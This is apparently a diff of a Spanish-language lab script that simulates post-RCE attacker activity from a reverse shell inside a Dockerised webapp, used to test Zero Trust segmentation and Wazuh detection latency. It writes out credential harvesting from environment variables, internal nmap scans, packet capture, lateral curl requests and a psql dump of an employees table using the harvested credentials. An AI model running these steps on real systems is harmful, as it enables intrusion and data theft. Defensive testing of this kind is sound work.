@@ -1,34 +1,193 @@
+# === ESCENARIO B (Zero Trust) — POST-RCE desde reverse shell en webapp ===
+
+#
+
+# CAPTURA UNIFICADA (levantar entorno + guardar logs al final):
+
+#   ./tests/scripts/logcapture_zerotrust.sh
+
+# El script muestra SESSION=tests/logs/zerotrust_sesion_YYYYMMDD_HHMMSS
+
+# y escribe la ruta en tests/.last_zerotrust_session
+
+# NO hace falta copiar artefactos a mano: pulsa ENTER en el script cuando termines.
+
+#
+
+# Wazuh (detección post-RCE desde DENTRO de webapp, no docker exec):
+
+#   process-webapp cada 2s → reglas 100100 nmap, 100101 curl→backend,
+
+#   100102 tcpdump, 100103 psql, 100104 grep credenciales env
+
+#   Latencia esperada: ≤5 s respecto a T0 si el agente está estable antes del RCE.
+
+#
+
+# Resultados esperados (Flask backend en 127.0.0.1):
+
+#   creds.txt          → vacío
+
+#   e1_scan.log        → db no resuelve; backend solo 443 open
+
+#   lateral.json       → vacío (curl :5000 → connection refused)
+
+#   lateral.pcap       → paquetes TLS/RST; sin HTTP JSON en claro
+
+#   dump.txt           → vacío
+
+
+
+# ---------------------------------------------------------------------------
+
+# T0_efectivo — registrar INMEDIATAMENTE tras estabilizar la shell (1ª vez)
+
+# Ver también tests/RCE comandos y notas.txt (bloque estabilización)
+
+# ---------------------------------------------------------------------------
+
+export TZ=Europe/Madrid
+
+export TERM=xterm-256color
+
+export PS1='[\D{%H:%M:%S}] root@webapp:\w\$ '
+
+stty rows 40 cols 120
+
+
+
+# Primera línea con timestamp visible = T0_efectivo (criterio plantilla KPI v2)
+
+echo "T0_efectivo=$(date '+%Y-%m-%d %H:%M:%S %Z')" | tee /tmp/t0_efectivo.txt
+
+echo "T0_efectivo PS1=$(date '+%H:%M:%S')" | tee -a /tmp/session_chrono.txt
+
+# En el listener ncat (host): anota a mano la hora de "Connection received"
+
+
+
+# ---------------------------------------------------------------------------
 
 # T_exfil_creds
+
+# ---------------------------------------------------------------------------
+
+echo "=== $(date '+%H:%M:%S') T_exfil_creds ===" | tee -a /tmp/session_chrono.txt
+
 id
+
 hostname
+
 env | grep -E 'DB_|POSTGRES|SECRET' | tee /tmp/creds.txt
 
-# Superficie interna visible - E1
+
+
+# ---------------------------------------------------------------------------
+
+# E1 — superficie interna visible
+
+# ---------------------------------------------------------------------------
+
+echo "=== $(date '+%H:%M:%S') E1 nmap ===" | tee -a /tmp/session_chrono.txt
+
 nmap -sT -Pn -p 22,80,443,5000,5432 --open backend db nginx 2>&1 | tee /tmp/e1_scan.log
-nmap -p 5000,5432,80 backend db nginx | tee /tmp/e1_scan.log
 
-# Integridad del tráfico - T_e3_pcap
-ip -brief link
 
-tcpdump -i any -nn -w /tmp/lateral.pcap -c 50 host backend & sleep 1
 
-# T_lateral - Profundidad
+# ---------------------------------------------------------------------------
+
+# T_lateral + T_e3_pcap — tcpdump con UNA sola reverse shell
+
+# Problema habitual: & y kill %1 fallan sin job control en reverse shell.
+
+# Solución: nohup + PID en fichero (no usa job control del shell).
+
+# En ZT el :5000 falla; generar tráfico en :443 para E3 (handshake TLS).
+
+# ---------------------------------------------------------------------------
+
+echo "=== $(date '+%H:%M:%S') T_e3_pcap start ===" | tee -a /tmp/session_chrono.txt
+
+
+
+rm -f /tmp/lateral.pcap /tmp/tcpdump.pid /tmp/tcpdump.log
+
+nohup tcpdump -i any -nn -w /tmp/lateral.pcap -c 100 host backend \
+
+  >/tmp/tcpdump.log 2>&1 &
+
+echo $! >/tmp/tcpdump.pid
+
+sleep 2
+
+
+
+echo "=== $(date '+%H:%M:%S') T_lateral http:5000 ===" | tee -a /tmp/session_chrono.txt
+
+curl -sv http://backend:5000/empleados 2>&1 | tee /tmp/lateral_attempt.log
+
 curl -s http://backend:5000/empleados | tee /tmp/lateral.json
-wc -c /tmp/lateral.json    # bytes fugados (parte de E2)
+
+
+
+echo "=== $(date '+%H:%M:%S') T_e3 https sin cert ===" | tee -a /tmp/session_chrono.txt
+
+curl -skv https://backend/empleados 2>&1 | tee -a /tmp/lateral_attempt.log
+
+
+
+# Esperar a que tcpdump termine solo (-c 100) o forzar parada limpia
+
+TCPDUMP_PID=$(cat /tmp/tcpdump.pid 2>/dev/null || echo "")
+
+if [ -n "$TCPDUMP_PID" ] && kill -0 "$TCPDUMP_PID" 2>/dev/null; then
+
+  sleep 3
+
+  kill "$TCPDUMP_PID" 2>/dev/null || true
+
+fi
+
+wait "$TCPDUMP_PID" 2>/dev/null || true
+
+ls -la /tmp/lateral.pcap /tmp/tcpdump.log
+
+wc -c /tmp/lateral.json
+
+
+
+# ---------------------------------------------------------------------------
 
 # T_objetivo
+
+# ---------------------------------------------------------------------------
+
+echo "=== $(date '+%H:%M:%S') T_objetivo ===" | tee -a /tmp/session_chrono.txt
+
+nc -zv db 5432 2>&1 | tee -a /tmp/dump.txt
+
 PGPASSWORD=$(grep DB_PASSWORD /tmp/creds.txt | cut -d= -f2) \
+
   psql -h db -U $(grep -E '^DB_USER|^POSTGRES_USER' /tmp/creds.txt | head -1 | cut -d= -f2) \
+
        -d $(grep -E '^DB_NAME|^POSTGRES_DB' /tmp/creds.txt | head -1 | cut -d= -f2) \
+
        -c 'SELECT count(*) FROM empleados; SELECT * FROM empleados LIMIT 5;' \
-  | tee /tmp/dump.txt
+
+  2>&1 | tee -a /tmp/dump.txt
 
 
+Comandos nuevos:
 
-SESSION=tests/logs/perimetral_sesion_20260523_175204
-docker compose -f infra/perimetral/docker-compose.yaml cp webapp:/tmp/lateral.pcap "${SESSION}/lateral.pcap"
-docker compose -f infra/perimetral/docker-compose.yaml cp webapp:/tmp/lateral.json "${SESSION}/lateral.json"
-docker compose -f infra/perimetral/docker-compose.yaml cp webapp:/tmp/creds.txt     "${SESSION}/creds.txt"
-docker compose -f infra/perimetral/docker-compose.yaml cp webapp:/tmp/dump.txt      "${SESSION}/dump.txt"
-docker compose -f infra/perimetral/docker-compose.yaml cp webapp:/tmp/e1_scan.log  "${SESSION}/e1_scan.log"
+nmap -sT -Pn -p 5432 db 2>&1 | tee -a /tmp/dump.txt
+
+psql -h db -U postgres -d empresa_db -c 'SELECT 1;' 2>&1 | tee -a /tmp/dump.txt
+
+# ---------------------------------------------------------------------------
+
+# Fin post-RCE → volver a la terminal de logcapture_zerotrust.sh y pulsar ENTER
+
+# (copia artefactos, logs por servicio, compose_all.log, wazuh_alerts.json)
+
+# ---------------------------------------------------------------------------
+
